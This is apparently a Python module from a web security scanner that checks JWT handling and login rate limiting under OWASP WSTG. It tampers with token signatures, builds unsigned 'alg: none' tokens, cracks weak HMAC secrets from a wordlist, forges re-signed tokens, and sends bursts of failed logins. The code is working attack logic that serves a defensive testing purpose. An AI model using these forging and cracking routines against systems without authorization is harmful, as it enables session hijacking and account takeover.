"""Authentication checks: JSON Web Tokens and login attempt limits (WSTG-SESS-10, WSTG-ATHN-03).

JWT: a token in an account's pasted session (an `Authorization` header or a cookie) is changed
and sent to a protected endpoint, one whose success response needs the token (without it the
response is refused or different). A changed token is accepted when its response is a success
with the same content as the real token's:
- the signature altered (the first character, so the bytes really change): the signature is
  not verified;
- `alg: none` with no signature: unsigned tokens are accepted;
- an HMAC secret found offline in a bundled list of common secrets, then a token with an added
  claim signed with it: anyone who guesses the secret can forge tokens.
Only GET requests; the cracking needs no request at all.

Login attempts: twelve failed logins with a random username that does not exist (so no real
account is ever locked) are sent to a login endpoint. No refusal (429/423/503), no changed
status or page, no lockout message, and no growing delay means attempts are not limited.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import secrets
import time
from collections.abc import Callable
from dataclasses import dataclass, field, replace
from importlib import resources
from typing import Any

import httpx

from rajdoll.modules import httpkit
from rajdoll.modules.authz_checks import Fetched, Target, send, similarity
from rajdoll.modules.base import Exchange

SAME_CONTENT = 0.9
_JWT = re.compile(r"eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*")
HMAC_ALGS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
NONE_VARIANTS = ("none", "None", "NONE")


def common_secrets() -> list[str]:
    """The bundled list of common JWT HMAC secrets (rajdoll/data/payloads/jwt_secrets.txt)."""
    text = resources.files("rajdoll.data").joinpath("payloads/jwt_secrets.txt").read_text()
    return [line for line in text.splitlines() if line and not line.startswith("#")]


# -- tokens ------------------------------------------------------------------------------------


@dataclass(frozen=True)
class TokenSlot:
    """Where a session carries a JWT."""

    location: str  # header | cookie
    name: str  # header name or cookie name
    token: str
    prefix: str = ""  # "Bearer " for an Authorization header

    @property
    def label(self) -> str:
        return f"header {self.name}" if self.location == "header" else f"cookie {self.name}"


def _cookie_pairs(value: str) -> list[tuple[str, str]]:
    pairs = []
    for part in value.split(";"):
        name, sep, cookie = part.strip().partition("=")
        if sep:
            pairs.append((name.strip(), cookie.strip()))
    return pairs


def find_tokens(headers: dict[str, str]) -> list[TokenSlot]:
    """The JWTs in session headers: `Authorization: Bearer <jwt>`, other headers, cookies."""
    slots: list[TokenSlot] = []
    for name, value in headers.items():
        if name.lower() == "cookie":
            slots += [
                TokenSlot("cookie", cookie, token)
                for cookie, token in _cookie_pairs(value)
                if _JWT.fullmatch(token)
            ]
            continue
        scheme, space, rest = value.strip().partition(" ")
        token, prefix = (rest.strip(), scheme + " ") if space else (value.strip(), "")
        if _JWT.fullmatch(token):
            slots.append(TokenSlot("header", name, token, prefix))
    return slots


def with_token(headers: dict[str, str], slot: TokenSlot, token: str | None) -> dict[str, str]:
    """`headers` with the slot's token replaced by `token`, or removed when None."""
    result = dict(headers)
    if slot.location == "header":
        key = next((k for k in result if k.lower() == slot.name.lower()), slot.name)
        if token is None:
            result.pop(key, None)
        else:
            result[key] = slot.prefix + token
        return result
    key = next((k for k in result if k.lower() == "cookie"), "Cookie")
    pairs = [
        (name, token if name == slot.name else value)
        for name, value in _cookie_pairs(result.get(key, ""))
        if token is not None or name != slot.name
    ]
    if pairs:
        result[key] = "; ".join(f"{name}={value}" for name, value in pairs)
    else:
        result.pop(key, None)
    return result


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _unb64url(text: str) -> bytes:
    return base64.urlsafe_b64decode(text + "=" * (-len(text) % 4))


def decode(token: str) -> tuple[dict[str, Any], dict[str, Any]] | None:
    """The header and claims of a JWT, or None when they are not JSON objects."""
    try:
        head, body, _signature = token.split(".")
        header, claims = json.loads(_unb64url(head)), json.loads(_unb64url(body))
    except (ValueError, TypeError):
        return None
    if not isinstance(header, dict) or not isinstance(claims, dict):
        return None
    return header, claims


def _encode(part: dict[str, Any]) -> str:
    return b64url(json.dumps(part, separators=(",", ":")).encode())


def _sign(signing_input: str, secret: str, alg: str) -> str:
    digest = hmac.new(secret.encode(), signing_input.encode(), HMAC_ALGS[alg]).digest()
    return b64url(digest)


def bad_signature(token: str) -> str:
    """The token with its signature's first character changed (six real bits differ)."""
    head, body, signature = token.split(".")
    first = "B" if signature[:1] == "A" else "A"
    return f"{head}.{body}.{first}{signature[1:]}"


def alg_none(token: str, variant: str = "none") -> str:
    """The same claims with `alg: none` and no signature."""
    decoded = decode(token)
    assert decoded is not None  # noqa: S101 (callers decode first)
    header, _claims = decoded
    return f"{_encode({**header, 'alg': variant})}.{token.split('.')[1]}."


def crack(token: str, candidates: list[str]) -> str | None:
    """The HMAC secret of `token` if it is in `candidates`; no request is sent."""
    decoded = decode(token)
    if decoded is None or decoded[0].get("alg") not in HMAC_ALGS:
        return None
    alg = str(decoded[0]["alg"])
    head, body, signature = token.split(".")
    for candidate in candidates:
        if hmac.compare_digest(_sign(f"{head}.{body}", candidate, alg), signature):
            return candidate
    return None


def forge(token: str, secret: str, marker: str) -> str:
    """A token with an added claim `rajdoll_uji`, signed with `secret` (the cracked secret)."""
    decoded = decode(token)
    assert decoded is not None  # noqa: S101
    header, claims = decoded
    head, body = _encode(header), _encode({**claims, "rajdoll_uji": marker})
    return f"{head}.{body}.{_sign(f'{head}.{body}', secret, str(header['alg']))}"


# -- sending ----------------------------------------------------------------------------------


@dataclass
class Probe:
    """A protected endpoint: what the real token gets, and what the request without it gets."""

    target: Target
    real: Fetched
    without: Fetched


def find_protected(
    client: httpx.Client,
    headers: dict[str, str],
    slot: TokenSlot,
    urls: list[str],
    account: str,
    check_cancelled: Callable[[], None],
) -> Probe | None:
    """The first URL that answers the real token with a success the request without the token
    does not get."""
    for url in urls:
        check_cancelled()
        target = Target(url)
        real = send(client, target, headers, f"[sesi {account}]", f"{account} dengan token asli")
        if not real.ok:
            continue
        stripped = with_token(headers, slot, None)
        without = send(
            client, target, stripped, f"[sesi {account} tanpa token]", f"{account} tanpa token"
        )
        if without.ok and similarity(real.text, without.text) >= SAME_CONTENT:
            continue  # this endpoint does not need the token
        return Probe(target, real, without)
    return None


def accepted(forged: Fetched, probe: Probe) -> bool:
    return (
        forged.ok
        and similarity(forged.text, probe.real.text) >= SAME_CONTENT
        and not (probe.without.ok and similarity(forged.text, probe.without.text) >= SAME_CONTENT)
    )


@dataclass
class JwtResult:
    vuln_type: str  # jwt_signature_not_verified | jwt_alg_none | jwt_weak_secret
    token: str  # the forged token that was accepted
    evidence: list[Exchange]
    note: str
    params: dict[str, Any] = field(default_factory=dict)


def try_forged(
    client: httpx.Client,
    headers: dict[str, str],
    slot: TokenSlot,
    probe: Probe,
    account: str,
    token: str,
    what: str,
) -> tuple[bool, Fetched]:
    forged = send(
        client,
        probe.target,
        with_token(headers, slot, token),
        f"[sesi {account}, token palsu: {what}]",
        f"token palsu ({what}) di {slot.label}",
    )
    return accepted(forged, probe), forged


def jwt_checks(
    client: httpx.Client,
    headers: dict[str, str],
    slot: TokenSlot,
    probe: Probe,
    account: str,
    secrets_list: list[str],
) -> list[JwtResult]:
    """The JWT weaknesses of one token on its protected endpoint."""
    found: list[JwtResult] = []
    base = [probe.real.exchange, probe.without.exchange]
    decoded = decode(slot.token)
    if decoded is None:
        return found
    altered = bad_signature(slot.token)
    ok, forged = try_forged(client, headers, slot, probe, account, altered, "tanda tangan diubah")
    if ok:
        note = f"Token dengan tanda tangan diubah diterima di {probe.target.label}."
        found.append(
            JwtResult("jwt_signature_not_verified", altered, [*base, forged.exchange], note)
        )
    else:
        for variant in NONE_VARIANTS:
            unsigned = alg_none(slot.token, variant)
            ok, forged = try_forged(
                client, headers, slot, probe, account, unsigned, f"alg={variant}"
            )
            if ok:
                note = f"Token tanpa tanda tangan (alg={variant}) diterima di {probe.target.label}."
                found.append(
                    JwtResult(
                        "jwt_alg_none",
                        unsigned,
                        [*base, forged.exchange],
                        note,
                        {"variant": variant},
                    )
                )
                break
    secret = crack(slot.token, secrets_list)
    if secret is not None:
        marker = secrets.token_hex(4)
        signed = forge(slot.token, secret, marker)
        ok, forged = try_forged(client, headers, slot, probe, account, signed, "diteken ulang")
        note = (
            "Secret HMAC token ada di daftar secret umum (nilainya hanya di PoC). Token dengan "
            "klaim tambahan yang diteken ulang dengan secret itu "
            + (f"diterima di {probe.target.label}." if ok else "tidak diterima; cek manual.")
        )
        found.append(
            JwtResult(
                "jwt_weak_secret",
                signed,
                [*base, forged.exchange],
                note,
                {"secret": secret, "forged_accepted": ok},
            )
        )
    return found


# -- login attempts ----------------------------------------------------------------------------

ATTEMPTS = 12
_PASSWORD = re.compile(r"pass|pwd|sandi", re.I)
_CSRF = re.compile(r"csrf|xsrf|_token$|^token$|authenticity|requestverification", re.I)
_USER = re.compile(r"user|login|mail|nip|nik|akun|account|name|nama|id$", re.I)
_LOCKOUT_WORDS = (
    "terkunci",
    "dikunci",
    "terlalu banyak",
    "coba lagi",
    "tunggu",
    "diblokir",
    "captcha",
    "locked",
    "too many",
    "rate limit",
    "try again",
    "temporarily",
    "blocked",
    "throttl",
)
_FAILURE_STATUSES = {200, 301, 302, 303, 307, 401}
_REFUSALS = {423, 429, 503}


@dataclass(frozen=True)
class LoginForm:
    """A login endpoint's fields, from the inventory (BSD 4.4 body params)."""

    method: str
    url: str
    user_field: str
    password_field: str
    location: str  # form | json | multipart
    other_fields: tuple[str, ...] = ()
    csrf_field: str | None = None


def login_form(endpoint: dict[str, Any]) -> LoginForm | None:
    """The login fields of an endpoint with a password parameter, else None."""
    if endpoint.get("method") not in ("POST", "PUT"):
        return None
    params = [p for p in endpoint.get("body_params") or [] if p.get("name")]
    names = [str(p["name"]) for p in params]
    password = next((n for n in names if _PASSWORD.search(n)), None)
    if password is None:
        return None
    csrf = next((n for n in names if n != password and _CSRF.search(n)), None)
    rest = [n for n in names if n not in (password, csrf)]
    user = next((n for n in rest if _USER.search(n)), rest[0] if rest else None)
    if user is None:
        return None
    locations = {p.get("location") for p in params}
    location = (
        "json" if "json" in locations else "multipart" if "multipart" in locations else "form"
    )
    others = tuple(n for n in rest if n != user)
    return LoginForm(
        str(endpoint["method"]),
        httpkit.concrete_url(str(endpoint["url"])),
        user,
        password,
        location,
        others,
        csrf,
    )


def random_username(field_name: str) -> str:
    name = f"rajdoll-uji-{secrets.token_hex(4)}"
    return f"{name}@contoh.test" if "mail" in field_name.lower() else name


_HIDDEN = (
    r"""<input[^>]*name=["']{name}["'][^>]*value=["']([^"']*)["']"""
    r"""|<input[^>]*value=["']([^"']*)["'][^>]*name=["']{name}["']"""
)


def _csrf_value(client: httpx.Client, form: LoginForm) -> str:
    """The form's CSRF token from a fresh GET of the login page (cookies kept)."""
    page = client.get(form.url, follow_redirects=False)
    match = re.search(_HIDDEN.format(name=re.escape(form.csrf_field or "")), page.text)
    return next((g for g in match.groups() if g), "") if match else ""


@dataclass
class Burst:
    limited: bool | None  # None: not a login failure to begin with (inconclusive)
    attempts: int
    evidence: list[Exchange]
    note: str
    username: str = ""
    statuses: list[int] = field(default_factory=list)


def _elapsed(response: httpx.Response, started: float) -> float:
    try:
        return response.elapsed.total_seconds()
    except RuntimeError:
        return time.monotonic() - started


def login_burst(
    client: httpx.Client,
    form: LoginForm,
    check_cancelled: Callable[[], None],
    attempts: int = ATTEMPTS,
) -> Burst:
    """Failed logins with one random, non-existent username; whether anything limited them."""
    username = random_username(form.user_field)
    body = {form.user_field: username, form.password_field: ""}
    body.update({name: httpkit.default_value(name) for name in form.other_fields})
    point = httpkit.Injection(
        form.method, form.url, form.password_field, form.location, {}, body, form.location
    )
    client.cookies.clear()
    client.follow_redirects = False  # a redirect back to the login page is the answer
    evidence: list[Exchange] = []
    statuses: list[int] = []
    first: tuple[httpx.Response, float] | None = None
    for number in range(1, attempts + 1):
        check_cancelled()
        if form.csrf_field:
            point = replace(point, body={**point.body, form.csrf_field: _csrf_value(client, form)})
        started = time.monotonic()
        response, exchange = point.send(
            client, f"Salah-{secrets.token_hex(4)}", None, f"percobaan login gagal ke-{number}"
        )
        elapsed = _elapsed(response, started)
        statuses.append(response.status_code)
        if first is None:
            evidence.append(exchange)
            if response.status_code not in _FAILURE_STATUSES:
                note = (
                    f"Login gagal dijawab HTTP {response.status_code}; bukan respons login biasa."
                )
                return Burst(None, number, evidence, note, username, statuses)
            first = (response, elapsed)
            continue
        reason = _limit_reason(first, response, elapsed)
        if reason:
            evidence.append(exchange)
            note = f"Percobaan ke-{number} dibatasi: {reason}."
            return Burst(True, number, evidence, note, username, statuses)
        if number == attempts:
            evidence.append(exchange)
    note = (
        f"{attempts} percobaan login gagal berturut-turut (username acak {username}) semuanya "
        f"dijawab sama (HTTP {statuses[0]}), tanpa penolakan, penundaan, atau pesan penguncian"
    )
    return Burst(False, attempts, evidence, note, username, statuses)


def _limit_reason(
    first: tuple[httpx.Response, float], response: httpx.Response, elapsed: float
) -> str:
    baseline, baseline_time = first
    if response.status_code in _REFUSALS:
        return f"HTTP {response.status_code}"
    if response.status_code != baseline.status_code:
        return f"status berubah {baseline.status_code} → {response.status_code}"
    text, before = response.text.lower(), baseline.text.lower()
    word = next((w for w in _LOCKOUT_WORDS if w in text and w not in before), None)
    if word:
        return f"pesan '{word}'"
    if similarity(baseline.text, response.text) < 0.7:
        return "isi respons berubah"
    if elapsed > max(3 * baseline_time, baseline_time + 2.0):
        return f"respons melambat ({elapsed:.1f} detik)"
    return ""
